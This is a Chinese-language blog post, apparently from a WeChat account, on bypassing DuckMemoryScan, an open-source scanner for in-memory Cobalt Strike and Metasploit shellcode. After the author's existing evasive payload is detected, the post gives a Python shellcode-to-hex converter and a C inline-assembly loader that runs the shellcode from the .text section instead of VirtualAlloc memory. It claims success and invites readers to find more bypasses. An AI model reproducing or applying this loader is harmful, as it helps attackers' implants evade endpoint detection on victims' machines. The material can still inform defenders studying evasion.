> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/1L1FcCYTXvdxPUSTi28FvQ)

 昨天的事，谢谢各位师傅们了，所以写了该文来感谢各位师傅。而且今天是元宵节，祝大家元宵节快乐哦。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08XULy3r8UIuBzNV27fQOMmGPUXeAZicnsryn4B4V66iaE4ykFcgOMcv4cZpzFF2c9jvu7WT0fs8zteQ/640?wx_fmt=png)

昨天，Github 上出现了一个针对 CS 与 MSF 的内存扫描项目名叫 DuckMemoryScan 地址为：https://github.com/huoji120/DuckMemoryScan

根据该项目的介绍：

1.  HWBP hook 检测 检测线程中所有疑似被 hwbp 隐形挂钩
    
2.  内存免杀 shellcode 检测 (metasploit,Cobaltstrike 完全检测)
    
3.  可疑进程检测 (主要针对有逃避性质的进程 [如过期签名与多各可执行区段])
    
4.  无文件落地木马检测 (检测所有已知内存加载木马)
    
5.  简易 rootkit 检测 (检测证书过期 / 拦截读取 / 证书无效的驱动)
    

也就是类似于之前的 CobaltStrikeScan 之类的工具，我们来看一下如何绕过它。

首先拿了一个我之前的免杀马做测试，发现成功的检测出来了，毕竟项目介绍中也写到了会对 "VirtualAlloc" 函数进行检测。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08XULy3r8UIuBzNV27fQOMmG5AsBR1YK68h6BkroQpKPUJQPdWDZ8MficE6Siahm961iauMG7tt2dJW8w/640?wx_fmt=png)

那么我们就可以来想其他办法来操作了，项目介绍中说 但大部分普通程序均不会在 VirtualAlloc 区域内执行代码. 一般都是在. text 区段内执行代码，那我们在. text 区段内执行代码不就行了嘛。

先使用我们的脚本转换一下 shellcode

```
import binascii
import sys
import re

if __name__ == "__main__":
  
  if len(sys.argv) < 2:
    sys.exit(0)
    
  try:
    data = binascii.b2a_hex(open(sys.argv[1], "rb").read()).decode()
  except:
    print("Error reading %s" % sys.argv[1])
    sys.exit(0)
    
  if "-list" in sys.argv:
    print("0x" + ",0x".join(re.findall("..", data)))
  else:
    print("\\x" + "\\x".join(re.findall("..", data)))
```

然后加载：

```
#include <Windows.h>

int main() {
    asm("call code\n\t"
        ".byte {{SHELLCODE}}\n\t" 
        "code:\n\t"
        "ret\n\t");

  return 0;
}
```

成功写入

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08XULy3r8UIuBzNV27fQOMmGvpyiciaBB1cplnv1ibt3e4ciciak0YeRsicwvfKicV8e57LyIpThQJWibqhhXw/640?wx_fmt=png)

成功绕过检测。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08XULy3r8UIuBzNV27fQOMmGqtrQiaA02tq2ibuSCLROy7uHib4AVibBZiadZ2cK29ic20fU9qB1WxhDE0EA/640?wx_fmt=png)

当然方法还有很多，就看各位师傅发挥了 (ps：每次检测这个程序都会检测出来微信，不明觉厉，23333)

     ▼

更多精彩推荐，请关注我们

▼

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08XZjHeWkA6jN4ScHYyWRlpHPPgib1gYwMYGnDWRCQLbibiabBTc7Nch96m7jwN4PO4178phshVicWjiaeA/640?wx_fmt=png)